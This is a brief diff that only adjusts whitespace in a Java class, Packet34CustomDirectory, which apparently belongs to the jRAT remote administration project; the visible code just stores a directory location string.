@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet34CustomDirectory extends AbstractOutgoingPacket {
 
 	private String location;
-	
+
 	public Packet34CustomDirectory(String location) {
 		this.location = location;
 	}
